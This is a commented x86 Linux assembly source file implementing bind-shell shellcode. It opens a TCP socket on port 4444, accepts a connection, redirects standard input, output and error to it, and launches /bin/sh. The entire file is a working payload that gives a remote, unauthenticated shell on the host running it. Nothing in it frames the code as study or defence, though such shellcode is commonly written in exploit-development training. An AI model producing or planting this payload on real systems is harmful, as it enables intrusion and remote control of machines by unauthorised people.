global _start


section .text


_start:
        xor ebx, ebx ; zero ebx
        mov ecx, ebx ; zero ecx 
        mul ebx ; zero eax and edx


        ; 1- Socket Creation
        mov al, 0x66 ; socket call 0x66
        mov bl, 0x1 ; SYS_SOCKET 1
        push edx ; int protocol -> IPPROTO_TCP = 0 
        push ebx ; int type -> SOCK_STREAM = 1 
        push 0x2 ; int domain -> AF_INET = 2
        mov ecx, esp
        int 0x80 ; sys_socketcall (SYS_SOCKET)
        mov edi, eax ; save socket fd


        ;   struct sockaddr_in addr;
        push edx ; NULL padding
        push edx ; NULL padding
        push edx ; sin.addr (0.0.0.0)
        push word 0x5c11 ; prot 4444 you can change this number to change the port
        push word 0x2 ; AF_INET
        mov esi, esp

        ;2 Bind
        mov al, 0x66 ; socketcall = 102
        mov bl, 0x2 ;SYS_BIND
        push 0x10 ; socklen_t address len
        push esi ; ESI = Server Address struct
        push edi ; push socket fd
        mov ecx, esp ; Move stack pointer to ECX
        int 0x80 ; Execute SYS_BIND

        ; 3 listen
        mov al, 0x66 ;  socketcall = 102
        mov bl, 0x4 ; SYS_LISTEN    4
        push edx ; int backlog = 0
        push edi ; EDI = sockfd
        mov ecx, esp ; Move stack pointer to ECX
        int 0x80 ; Execute SYS_LISTEN

        ;4 accept
        mov al, 0x66 ;  socketcall = 102
        mov bl, 0x5 ; SYS_ACCEPT 5
        push edx ; NULL
        push edx ; NULL
        push edi ; EDI = sockfd
        mov ecx, esp ; Move stack pointer to ECX
        int 0x80 ; Execute SYS_ACCEPT
        mov edi, eax ; save acceptfd in edi 

        ;5 dup2
        xor ecx, ecx ; zero ecx
        mov cl, 0x3 ; to loop 3 times
loop: ; loop lable
        xor eax, eax ; zero eax
        mov al,0x3f ; dup2 63  -> Hex: 0x3f
        mov ebx, edi ; edi = acceptfd 
        dec cl ;  Decrementing the counter by 1
        int 0x80 ; Execute dup2
        jnz loop  ; Jump back to the beginning of the loop until CL is set to zero flag

        ;6 execve
        push edx ; NULL
        push 0x68732f6e ; "hs/n"  <-- //bin/sh
        push 0x69622f2f ; "ib//"
        mov ebx, esp ;   Move stack pointer to EBX
        push edx ; NULL 
        push ebx 
        mov ecx, esp  ; Move stack pointer to ECX
        mov al, 0xb ; _execve   11  -> Hex: 0xb
        int 0x80 ; Execute execve

